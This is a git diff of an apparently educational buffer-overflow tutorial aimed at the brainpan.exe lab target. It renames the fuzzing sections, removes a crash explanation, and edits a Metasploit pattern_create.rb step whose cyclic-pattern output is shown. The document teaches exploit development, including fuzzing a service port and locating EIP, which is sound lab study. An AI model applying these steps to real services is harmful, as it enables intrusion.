@@ -7,10 +7,10 @@
 6. Generate Shell Code
 7. Exploit
 
-# Fuzzing
-The following Python script can be modified and used to fuzz remote entry points to an application. It will send increasingly long buffer strings in the hope that one eventually crashes the application.
+# 1. Crash the application 
+The following Python script can be modified and used to fuzz remote entry points to an application. It will send increasingly long buffer strings in the hope that one eventually crashes the application. **Choose one of these versions.**
 
-### Version 1
+### Fuzzer Version 1
 
 ```Python
 #!/usr/bin/python 
@@ -33,7 +33,7 @@ finally:
 	s.close()
 ```
 
-### Version 2
+### Fuzzer Version 2
 
 ```Python
     #!/usr/bin/python 
@@ -71,23 +71,12 @@ finally:
         time.sleep(1)
 ```
 
-
-## Explanation:
-
-### 1. Crash the application 
-
-To start with our buffer overflow, we need to identify how much data we must send to cause the application to crash. This application binds to port 9999 we are using a python script (fuzz.py) to accomplish this. You can modify fuzz.py to meet your needs but take note we are using the loopback address as we are launching brainpan.exe via Wine locally on our Kali machine.
-
-This script will send \x41 (A) incrementally, 100 bytes at a time to port 9999 until it's no longer able to communicate with that port. In this case, the application appears to stop communicating around ~600 bytes. See our A's in the ESP?
-
-![Alt text](https://github.com/gh0x0st/Buffer_Overflow/blob/master/Screenshots/step1_crash_the_app.png?raw=true "Crash The Application")
-
-### 2. Find EIP
+# 2. Find EIP
 
 We are able to establish that we are able to crash the application with a relative number of bytes. Now we need to identify the exact number bytes that it takes to fill the buffer. Metasploit provides a ruby script called pattern_create.rb that will create a unique string with no repeating characters. After we send this payload to the buffer, it will display what the offset is which we'll use for the next step in finding the EIP.
 
 ```
-root@gh0x0st:~# /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 600
+root@gh0x0st:~# /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 666 (Change the 666 value to the value that crashed the server) 
 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9
 ```
 
